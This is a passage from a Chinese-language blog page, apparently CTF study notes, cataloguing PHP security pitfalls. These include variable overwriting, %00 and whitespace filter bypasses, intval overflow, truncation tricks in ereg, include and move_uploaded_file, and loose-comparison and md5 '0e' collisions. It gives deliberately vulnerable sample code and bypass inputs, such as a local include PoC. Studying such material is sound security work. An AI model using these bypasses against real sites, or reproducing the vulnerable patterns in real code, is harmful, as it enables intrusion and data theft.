class=\"comment\">//导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"cg\"</span>， <span class=\"string\">\"cg_\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量覆盖-1\"><a href=\"#变量覆盖-1\" class=\"headerlink\" title=\"$变量覆盖\"></a>$变量覆盖</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span>  </span><br><span class=\"line\">$chs = <span class=\"string\">''</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST &amp;&amp; $charset != <span class=\"string\">'utf-8'</span>)&#123;  </span><br><span class=\"line\">    $chs = <span class=\"keyword\">new</span> Chinese(<span class=\"string\">'UTF-8'</span>, $charset);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $key =&gt; $value)&#123;  </span><br><span class=\"line\">        $$key = $chs-&gt;Convert($value);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">unset</span>($chs);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"全局变量覆盖漏洞\"><a href=\"#全局变量覆盖漏洞\" class=\"headerlink\" title=\"全局变量覆盖漏洞\"></a>全局变量覆盖漏洞</h3><p>原理：<br>register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。<br>如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>\n<p>\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// register_globals =ON</span></span><br><span class=\"line\"><span class=\"comment\">//foo.php?GLOBALS[foobar]=HELLO</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $foobar;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//为了安全取消全局变量</span></span><br><span class=\"line\"><span class=\"comment\">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ini_get(<span class=\"string\">\"register_globals\"</span>)) <span class=\"keyword\">foreach</span>($_REQUEST <span class=\"keyword\">as</span> $k=&gt;$v) <span class=\"keyword\">unset</span>($&#123;$k&#125;);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $a;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $_GET[b];</span><br></pre></td></tr></table></figure>\n<p>经过测试，开了register_globals会卡死</p>\n<h2 id=\"绕过过滤的空白字符\"><a href=\"#绕过过滤的空白字符\" class=\"headerlink\" title=\"绕过过滤的空白字符\"></a>绕过过滤的空白字符</h2><p>原理：<a href=\"https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">控制码</span><br><span class=\"line\">&quot;\\0&quot; &quot;%00&quot; (ASCII  0 (0x00))，空字节符。</span><br><span class=\"line\"></span><br><span class=\"line\">制表符</span><br><span class=\"line\">&quot;\\t&quot; (ASCII  9 (0x09))，水平制表符。</span><br><span class=\"line\"></span><br><span class=\"line\">空白字符：</span><br><span class=\"line\">&quot;\\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class=\"line\">&quot;\\v&quot; &quot;\\x0b&quot; (ASCII  11 (0x0B))，垂直制表符。</span><br><span class=\"line\">&quot;\\f&quot; &quot;%0c&quot; 换页符</span><br><span class=\"line\">&quot;\\r&quot; &quot;%0d&quot;(ASCII  13 (0x0D))，回车符。</span><br><span class=\"line\"></span><br><span class=\"line\">空格:</span><br><span class=\"line\">&quot; &quot; &quot;%20&quot; (ASCII  32 (0x20))，普通空格符。</span><br></pre></td></tr></table></figure>\n<p>而trim过滤的空白字符有<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string trim ( string $str [, string $character_mask = <span class=\"string\">\" \\t\\n\\r\\0\\x0B\"</span> ] )</span><br></pre></td></tr></table></figure></p>\n<p>其中缺少了\\f</p>\n<p>2 函数对空白字符的特性<br>is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。<br>也就是说，is_numeirc(“ \\r\\n \\t 1.2”)是会返回true的。同理，intval(“ \\r\\n \\t 12”)，也会正常返回12。</p>\n<p>案例</p>\n<p><a href=\"https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?number=%00%0c191</span></span><br><span class=\"line\"><span class=\"comment\"># 1 %00绕过is_numeric</span></span><br><span class=\"line\"><span class=\"comment\"># 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"intval整数溢出\"><a href=\"#intval整数溢出\" class=\"headerlink\" title=\"intval整数溢出\"></a>intval整数溢出</h2><p>php整数上限溢出绕过intval</p>\n<p>intval 函数最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>\n<h2 id=\"intval-四舍五入\"><a href=\"#intval-四舍五入\" class=\"headerlink\" title=\"intval 四舍五入\"></a>intval 四舍五入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?a=1024.1</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[id]) &#123;</span><br><span class=\"line\">mysql_connect(SAE_MYSQL_HOST_M . <span class=\"string\">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class=\"line\">mysql_select_db(SAE_MYSQL_DB);</span><br><span class=\"line\">$id = intval($_GET[id]); <span class=\"comment\">## 这里过滤只有一个intval</span></span><br><span class=\"line\">$query = @mysql_fetch_array(mysql_query(<span class=\"string\">\"select content from ctf2 where id='$id'\"</span>));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[id]==<span class=\"number\">1024</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;no! try again&lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>($query[content]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"浮点数精度忽略\"><a href=\"#浮点数精度忽略\" class=\"headerlink\" title=\"浮点数精度忽略\"></a>浮点数精度忽略</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($req[<span class=\"string\">\"number\"</span>] != intval($req[<span class=\"string\">\"number\"</span>]))</span><br></pre></td></tr></table></figure>\n<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。<br>输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>\n<h2 id=\"多重加密\"><a href=\"#多重加密\" class=\"headerlink\" title=\"多重加密\"></a>多重加密</h2><p>题目中有：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$login = unserialize(gzuncompress(base64_decode($requset[<span class=\"string\">'token'</span>])));</span><br><span class=\"line\"><span class=\"keyword\">if</span>($login[<span class=\"string\">'user'</span>] === <span class=\"string\">'ichunqiu'</span>)&#123;<span class=\"keyword\">echo</span> $flag;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>本地则写：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$arr = <span class=\"keyword\">array</span>([<span class=\"string\">'user'</span>] === <span class=\"string\">'ichunqiu'</span>);</span><br><span class=\"line\">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class=\"line\">print_r($token);</span><br><span class=\"line\"><span class=\"comment\">// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"截断\"><a href=\"#截断\" class=\"headerlink\" title=\"截断\"></a>截断</h2><h3 id=\"iconv-异常字符截断\"><a href=\"#iconv-异常字符截断\" class=\"headerlink\" title=\"iconv 异常字符截断\"></a>iconv 异常字符截断</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。</span></span><br><span class=\"line\"><span class=\"comment\">## 这里chr(128)到chr(255)都可以截断。</span></span><br><span class=\"line\">$a=<span class=\"string\">'1'</span>.char(<span class=\"number\">130</span>).<span class=\"string\">'2'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> iconv(<span class=\"string\">\"UTF-8\"</span>,<span class=\"string\">\"gbk\"</span>,$a); <span class=\"comment\">//将字符串的编码从UTF-8转到gbk</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> iconv(<span class=\"string\">'GB2312'</span>, <span class=\"string\">'UTF-8'</span>, $str); <span class=\"comment\">//将字符串的编码从GB2312转到UTF-8</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"eregi、ereg可用-00截断\"><a href=\"#eregi、ereg可用-00截断\" class=\"headerlink\" title=\"eregi、ereg可用%00截断\"></a>eregi、ereg可用%00截断</h3><p>功能：正则匹配过滤<br>条件：要求php&lt;5.3.4</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*</span></span><br><span class=\"line\"><span class=\"comment\">#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag</span></span><br><span class=\"line\"><span class=\"comment\">#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。</span></span><br><span class=\"line\"><span class=\"comment\">#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span> ($_GET[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ereg (<span class=\"string\">\"^[a-zA-Z0-9]+$\"</span>,$_GET[<span class=\"string\">'password'</span>]) === <span class=\"keyword\">FALSE</span>)    </span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strlen($_GET[<span class=\"string\">'password'</span>]) &lt; <span class=\"number\">8</span> &amp;&amp; $_GET[<span class=\"string\">'password'</span>] &gt; <span class=\"number\">9999999</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos ($_GET[<span class=\"string\">'password'</span>], <span class=\"string\">'*-*'</span>) !== <span class=\"keyword\">FALSE</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span> . $flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"move-uploaded-file-用-0截断\"><a href=\"#move-uploaded-file-用-0截断\" class=\"headerlink\" title=\"move_uploaded_file 用\\0截断\"></a>move_uploaded_file 用\\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生<br>cve：<br><a href=\"https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\" target=\"_blank\" rel=\"noopener\">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>\n<p><code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\\x00.jpg&quot;)</code><br>上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>\n<h3 id=\"include用？截断\"><a href=\"#include用？截断\" class=\"headerlink\" title=\"include用？截断\"></a>include用？截断</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$name=$_GET[<span class=\"string\">'name'</span>];  </span><br><span class=\"line\">$filename=$name.<span class=\"string\">'.php'</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span> $filename;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br>测试POC：<br><a href=\"http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt</a>?<br>则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>\n<h3 id=\"系统长度截断\"><a href=\"#系统长度截断\" class=\"headerlink\" title=\"系统长度截断\"></a>系统长度截断</h3><p>这种方式在PHP5.3以后的版本中都已经得到了修复。<br>win260个字符，linux下4*1024=4096字节</p>\n<h3 id=\"mysql长度截断\"><a href=\"#mysql长度截断\" class=\"headerlink\" title=\"mysql长度截断\"></a>mysql长度截断</h3><p>mysql内的默认字符长度为255，超过的就没了。<br>由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>\n<h3 id=\"mysql中utf-8截断\"><a href=\"#mysql中utf-8截断\" class=\"headerlink\" title=\"mysql中utf-8截断\"></a>mysql中utf-8截断</h3><p><code>insert into dvwa.test values (14,concat(&quot;admin&quot;,0xc1,&quot;abc&quot;))</code></p>\n<p>写入为admin</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><p>原理</p>\n<p>比较表：<a href=\"http://php.net/manual/zh/types.comparisons.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/types.comparisons.php</a></p>\n<p>以下等式会成立<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">''</span> == <span class=\"number\">0</span> == <span class=\"keyword\">false</span></span><br><span class=\"line\"><span class=\"string\">'123'</span> == <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span> == <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"string\">'123a'</span> == <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"string\">'0x01'</span> == <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"string\">'0e123456789'</span> == <span class=\"string\">'0e987654321'</span></span><br><span class=\"line\">[<span class=\"keyword\">false</span>] == [<span class=\"number\">0</span>] == [<span class=\"keyword\">NULL</span>] == [<span class=\"string\">''</span>]</span><br><span class=\"line\"><span class=\"keyword\">NULL</span> == <span class=\"keyword\">false</span> == <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">true</span> == <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"、-gt-、-lt-的弱类型比较\"><a href=\"#、-gt-、-lt-的弱类型比较\" class=\"headerlink\" title=\"==、&gt;、&lt;的弱类型比较\"></a>==、&gt;、&lt;的弱类型比较</h3><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##方法1</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=\"1e8%00\";</span></span><br><span class=\"line\"><span class=\"comment\">##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1</span></span><br><span class=\"line\"><span class=\"comment\">##方法2</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=[\"a\"];</span></span><br><span class=\"line\"><span class=\"comment\">##使用数组，可以，因为数组恒大于数字或字符串</span></span><br><span class=\"line\"><span class=\"comment\">##方法3</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=1337a;</span></span><br><span class=\"line\"><span class=\"comment\">##1337a过is_numeric，又由&gt;转成1337与1336比较</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">is_numeric(@$a[<span class=\"string\">\"a1\"</span>])?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;    </span><br><span class=\"line\"><span class=\"keyword\">if</span>(@$a[<span class=\"string\">\"a1\"</span>])&#123;</span><br><span class=\"line\">\t\tvar_dump($a);</span><br><span class=\"line\">        ($a[<span class=\"string\">\"a1\"</span>]&gt;<span class=\"number\">1336</span>)?$v1=<span class=\"number\">1</span>:<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump($v1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"switch-弱类型\"><a href=\"#switch-弱类型\" class=\"headerlink\" title=\"switch 弱类型\"></a>switch 弱类型</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 第一种：弱类型，1e==1</span></span><br><span class=\"line\"><span class=\"comment\">// $x1=1e</span></span><br><span class=\"line\"><span class=\"comment\">// 第二种：利用数组名字bypass</span></span><br><span class=\"line\"><span class=\"comment\">// $x1=1[]</span></span><br><span class=\"line\"><span class=\"comment\">// 传入后为string(3) \"1[]\",但在switch那里为1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'x1'</span>]))</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">        $x1 = $_GET[<span class=\"string\">'x1'</span>]; </span><br><span class=\"line\">        $x1==<span class=\"string\">\"1\"</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"ha?\"</span>):<span class=\"keyword\">NULL</span>; </span><br><span class=\"line\">        <span class=\"keyword\">switch</span> ($x1) </span><br><span class=\"line\">        &#123; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">0</span>: </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: </span><br><span class=\"line\">                $a=<span class=\"number\">1</span>; </span><br><span class=\"line\">                <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"md5比较（0e相等、数组为Null）\"><a href=\"#md5比较（0e相等、数组为Null）\" class=\"headerlink\" title=\"md5比较（0e相等、数组为Null）\"></a>md5比较（0e相等、数组为Null）</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(<span class=\"string\">'240610708'</span>) <span class=\"comment\">//0e462097431906509019562988736854</span></span><br><span class=\"line\">md5(<span class=\"string\">'QNKCDZO'</span>) <span class=\"comment\">//0e830400451993494058024219903391</span></span><br><span class=\"line\"><span class=\"number\">0</span>e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。</span><br><span class=\"line\">md5(<span class=\"string\">'240610708'</span>)==md5(<span class=\"string\">'QNKCDZO'</span>); <span class=\"comment\">//True</span></span><br><span class=\"line\">md5(<span class=\"string\">'240610708'</span>)===md5(<span class=\"string\">'QNKCDZO'</span>); <span class=\"comment\">//False</span></span><br><span class=\"line\"></span><br><span class=\"line\">这样的对应数值还有：</span><br><span class=\"line\">var_dump(md5(<span class=\"string\">'240610708'</span>) == md5(<span class=\"string\">'QNKCDZO'</span>));</span><br><span class=\"line\">var_dump(md5(<span class=\"string\">'aabg7XSs'</span>) == md5(<span class=\"string\">'aabC9RqS'</span>));</span><br><span class=\"line\">var_dump(sha1(<span class=\"string\">'aaroZmOk'</span>) == sha1(<span class=\"string\">'aaK1STfY'</span>));</span><br><span class=\"line\">var_dump(sha1(<span class=\"string\">'aaO8zKZF'</span>) == sha1(<span class=\"string\">'aa3OFF9m'</span>));</span><br><span class=\"line\">var_dump(<span class=\"string\">'0010e2'</span> == <span class=\"string\">'1e3'</span>);</span><br><span class=\"line\">var_dump(<span class=\"string\">'0x1234Ab'</span> == <span class=\"string\">'1193131'</span>);</span><br><span class=\"line\">var_dump(<span class=\"string\">'0xABCdef'</span> == <span class=\"string\">' 0xABCdef'</span>);</span><br></pre></td></tr></table></figure>\n<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方法1</span></span><br><span class=\"line\"><span class=\"comment\">#s1=QNKCDZO&amp;s2=240610708</span></span><br><span class=\"line\"><span class=\"comment\">#方法2</span></span><br><span class=\"line\"><span class=\"comment\">#?s1[]=1&amp;s2[]=2</span></span><br><span class=\"line\"><span class=\"comment\">#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null</span></span><br><span class=\"line\"><span class=\"comment\">#则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])</span></span><br><span class=\"line\">define(<span class=\"string\">'FLAG'</span>, <span class=\"string\">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'s1'</span>] != $_GET[<span class=\"string\">'s2'</span>]</span><br><span class=\"line\">&amp;&amp; md5($_GET[<span class=\"string\">'s1'</span>]) == md5($_GET[<span class=\"string\">'s2'</span>])) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success, flag:\"</span> . FLAG;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 